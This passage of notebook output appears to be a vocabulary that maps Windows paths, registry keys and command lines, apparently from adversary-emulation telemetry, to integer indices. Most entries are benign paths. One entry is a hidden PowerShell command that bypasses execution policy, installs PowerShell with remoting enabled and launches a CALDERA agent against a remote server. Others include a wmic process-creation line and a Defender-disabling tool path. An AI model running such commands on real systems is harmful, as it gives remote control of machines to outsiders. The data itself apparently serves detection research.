       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe\\\\Licenses': 16,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\Settings': 17,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AppData': 18,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\sr\\\\.git': 19,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\sr-Latn-RS\\\\*': 20,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\hr\\\\.git': 21,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\en_US\\\\*': 22,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\windows_ie_ac_001\\\\AC\\\\Temp\\\\*': 23,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 24,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Windows PowerShell': 25,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\Settings\\\\.git': 26,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\AppData': 27,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\\\LocalCache': 28,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Code Cache\\\\wasm\\\\.git': 29,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\fil\\\\*': 30,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\INetCache': 31,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Site Characteristics Database': 32,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData\\\\.git': 33,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\LocalState\\\\.git': 34,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\hu': 35,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\Settings': 36,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 37,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\chrome\\\\idb\\\\3561288849sdhlie.files\\\\*': 38,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Speech Recognition\\\\1.15.0.1': 39,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Cyrl-BA\\\\*': 40,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\\\\Settings\\\\*': 41,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 42,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\99.0.1150.46\\\\Default\\\\AutofillStrikeDatabase': 43,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\AC': 44,\n",
       " 'C:\\\\Users\\\\amanda90\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Storage-Account-Private-Container': 45,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\PeerDistRepub\\\\*': 46,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\fr': 47,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\zh_CN\\\\*': 48,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsMaps_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 49,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\hi': 50,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker': 51,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\AppCache\\\\*': 52,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\TempState': 53,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 54,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\*': 55,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\.git': 56,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\.git': 57,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\\\LocalState': 58,\n",
       " 'C:\\\\Windows\\\\SystemResources\\\\SspiCli.dll.mun': 59,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\Cache': 60,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fi-FI\\\\*': 61,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AC\\\\INetCookies': 62,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Packages\\\\ActiveSync\\\\.git': 63,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\sw\\\\*': 64,\n",
       " 'C:\\\\Users\\\\wthornton\\\\Desktop\\\\DefenderControlrPortable': 65,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\docker\\\\caldera\\\\2.6.6-040520': 66,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\hi': 67,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\Settings\\\\.git': 68,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 69,\n",
       " 'wmic process call create \"3ecfc67294923acdf6bd018a73f6c590\"': 70,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-CO\\\\.git': 71,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\\\Settings\\\\*': 72,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 73,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\LocalCache\\\\Local\\\\Microsoft': 74,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 75,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sl\\\\.git': 76,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\TempState': 77,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\el\\\\.git': 78,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\AC\\\\*': 79,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\\\SystemAppData\\\\*': 80,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{D20BEEC4-5CA8-4905-AE3B-BF251EA09B53}\\\\StreamResource': 81,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\vi\\\\.git': 82,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\Settings': 83,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\cache2\\\\entries\\\\*': 84,\n",
       " 'HKLM\\\\Software\\\\WOW6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows': 85,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\.git': 86,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Session Storage\\\\*': 87,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\TempState\\\\*': 88,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\Settings\\\\.git': 89,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\images\\\\lightTheme': 90,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\sl': 91,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\RoamingState\\\\.git': 92,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 93,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\AC\\\\*': 94,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker\\\\CacheStorage\\\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\\\faf4f793-ede9-45f4-b561-85e54c465501\\\\index-dir': 95,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\AC\\\\Temp\\\\*': 96,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\LocalCache\\\\*': 97,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\*': 98,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\*': 99,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\fi\\\\*': 100,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 101,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\mn\\\\.git': 102,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Photos_8wekyb3d8bbwe': 103,\n",
       " 'C:\\\\Users\\\\priscillaroberson\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\UserData\\\\Low\\\\*': 104,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 105,\n",
       " 'LAMIRE': 106,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\LocalState\\\\.git': 107,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\TempState': 108,\n",
       " 'powershell.exe -ExecutionPolicy Bypass -C \"$wc=New-Object System.Net.WebClient;$output=\\\\\"PowerShellCore.msi\\\\\";$wc.DownloadFile(\\\\\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\\\\\", $output);Start-Process msiexec.exe -ArgumentList \\\\\"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\\\\\" -Wait;$env:Path += \\\\\";C:\\\\Program Files\\\\Powershell\\\\6\\\\\";Start-Process pwsh -ArgumentList \\\\\"-c C:\\\\Users\\\\Public\\\\sandcat.go-windows.exe -server http://38.147.122.251/tor/micro/d/flvnBFO7aooEi/Ota+OTBrjtJM1BFzugFRG097+uETM-b1yHYnAHWu7yp7zmoyOFxGqsz9cRU0R291Aja2grUo8-eMGUWrIcbejzmmBw9/C20Nm+kPahIjSR7LXOK1p9alA-CkxtwS2UygICgI/WxNuvFFIAkdXru+fDW4QvKllotgY-yFlyGn3HpVxpMlWynrfpAK89YcktX0EQOokfP6xH3UY-TOE28AOCTRZ0YlkAeqtvJRBwB2m364NzNqx/FodHulg-cSLxPPNnpt6xL78t+EZboeuMei3aMMtxONxqo7E/III-ePt1wNGrtXv2pLkN7dnN1AJA955txP3qNu4ogFHh5mA-oXRX4JMP5tu6maRf14qdA0zIzgr0BW0TFr5sJwTF8Jk-pf9FUFcxfnh93FBjGhNLLIpMm56IYQ4cUuBMQagjg2w-QxAhOV8Eva1GEfWLWefTP1xpjaf68kifwSM5xD/ggKo-45RsG3KOOV1AMmYVIhm03p1DkslwBJ1EPQo72okeLVw-Z95rTeP52h1ephLoLs0VtKCFhsE0HgBLZTxrA0COPOI-CW3/yBf6DxShImTL8iBNGnJ1hPKbomPgLQeXW7vbl2w-YMuFgzWl6vd3YsyBfYmMz1ZjcaMwrkxrqGm4heukkk8-Md01oo05BRzqYo0RxAnJv25xPvCq4vWpJYpJyPdYSWk-3E6F/v8oDIXrpdYqO/9vKpSnGLP4n65vGD4OSsnkKRs-ZjW2fQbq02b9FZugHtihwpD4l+ncReO1trDPoN/MCfU-Pcv5njv48Uc7pPSlud/7GYgOW5e4RB6f48eR6VvUDDc-VGTeayc4K1JLPg4ztvdoiuPhFsn98qnH9G9VFApURBo-bLFGrW+TBLYCUiJd1000JkM9Cqyqy4bRTDF3IvItYeE-OU9sIFld8CaR1onU8BFj62haoiMIyZ2sP80yznbjbpI-rfaREnpaJJmDxjU1WmPbOZC6zJhF2K4zcUuSxXIu5I4-XoCtpEI0rxeK7JJzhpvVsqt7OoDpEDTrqsWJoz34Wm4-44RH8wfKN6+88axDfQyf4PpcIZYr9oAbTnE9rs13+cY-/bqddtOsYADFqcY3Hr7Ma3K/V47nOeMWiTAD92wUm6w-dKfugxwTbM1DLf2bQQSfVWaK4hC8t/sMR347gm2I75k-6FcN1QuUDSTSg99JivGrpMkgW5K3lDf6q0bWLab7PpE-AO4mYpVOI9dCQU0Lfm0b9WF2AQr1nawIdqpuvXaP7Zs-fSP8WCqcUlJmLDzuu+FXcTXT2iKyD78F8JBIVXQy5lI-krq0rU54e+t/YWjYz3zkFSdYm/xJ4w05+TdMS9hBDuc-FDY9mctVGSVER3O8bmY/fLvEzQs2ym0Zv1XfMdqz6YE-EMtxZsoW1o/Oydn0gJtP2JCGbCEizbG2hcZxD6sHYZI-0PbfelOAFHUfIv9bHaEEEHiXOdm6YMqAYvj5z+JZjOE-E6sHCy6cIR0qbNEmMupoYJw3EtEa+U/7MQOd3OUL5iA-66wr1N4YtZsjJ137iPlI2+i2hbBjTXYcO4SuHu4f4aU-VurQmo2B9bJSGi+CXuRWmGUAcvl9zGLkiTBTY9+eaN4-X6Wy+2UNuOnr5S45BJZ2G/SW/ljkI2Aelk5LQ/LX990-ffS4Vi7SelAmAfAfg99+sYsEJ6hVMptyfRVCTO8Z4VI-ht47QIYzyoi3RId10pk3aUDNOUzOYjVlRwn2JCin3W0-7+MJqJv9+bnLaagu5+X2T2SsH/V5qKH4sSutsY6YHrs-W2EDPrLEw2xXm/t5ycdLiptKnDSKiohgp49UJRHxxwM-qfaXYWT/g0CIhyQ7mNo0hGW/FgBUAduKUF656y3OLLw-zTKZ6vpQuGDFilqKAlUipAs4p7td55kMvRxliVgjL/4-ZkExWn0zi4joCC/JRUtop9/yGRvfMQXCi91tn0jbjL0-8s3Ko09Tlq4po6ijiu1PJF4NwzQApiUwo7cW2SlDETM-uwtJo8CvR3KSpFMYF2ecg5gfnMybp5Ozda07ksIHnuE-sowskPXLCCoou4rbN1Jcp5uEvFKAacd95gGcqOB5+3I-Vqm4dbmPwI79h4kWgxiaDX4ECPg0ZzMkGspGnI8Dv9Y-u2ad6hdPBikkONK6VjQmtmqiYb4zV8Zi60uD5s2WzzU-Ic0GpWlupg/ybYcIyPiyW8aya66HghUfRvNAar5vJpg-KHixS4GtfQBeZBtmUlmV9C8YGqR27u7K1oRaYhoFD4Y-u//xDaipRj5moMsmlPZjHwf5M/kvhTWaDEn8cfyed+k-5TVcNnoOTOZ4yMNxB+P/Wb9O3/0805JeCPgkZ+NF/0g-Twpb6f6LxkXB2ZY81w8w5ON9hI3qAXh4np09NGX7C2U-+5IyA734bNyyqIuC0ovt/kmfm3w33bSpejuTYCqQNyw-rsUAsE7FqW6TtWyY75Ee6XYKgfgTxhJxyQ/B5ZM4sUw-Q8xyLKgyb6YUxj7NGVs76I0pm40QYx71YWNTkimCOfA-ifjMygOuIRU9mVRIxZH5qC7wcoaxjBeGrR6IIW9qbvw-WCfH2Bbd2adG1TcmhYdTqdk4X3ByX0d2FUaVp/dbNHE-qqGVJ3gmYGV9L4G3REakG8A5pjrzJ75i2tby2jZW368-cKFBSY1U2KjsNrFnQw3+WYfMG4Y64GiPM265hvyQ8TM-IuRWfxZNqNg2mVhJ/bOOq55oEESCQVvki2a4rhtA9/Y-IRxD3mug63kPZYQiDXs2Wh10L2Fh9091lv0dPs1F9dE - group CALDERA\\\\\" -WindowStyle hidden;\"': 109,\n",
       " 'C:\\\\Users\\\\inguyen\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\nxlog': 110,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 111,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy\\\\AC\\\\*': 112,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Cyrl-BA\\\\.git': 113,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\Settings': 114,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\nl': 115,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\*': 116,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\hr\\\\*': 117,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\RoamingState\\\\.git': 118,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 119,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BingWeather_8wekyb3d8bbwe\\\\TempState\\\\.git': 120,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker': 121,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\RoamingState\\\\*': 122,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AC\\\\Temp': 123,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 124,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-2\\\\cache2\\\\doomed\\\\*': 125,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\da': 126,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 127,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\lt\\\\*': 128,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy': 129,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-1\\\\.git': 130,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-3\\\\.git': 131,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\BackgroundTransferApi\\\\.git': 132,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 133,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\ja\\\\.git': 134,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AppData\\\\.git': 135,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\fi\\\\*': 136,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\settings\\\\.git': 137,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\LocalState\\\\*': 138,\n",
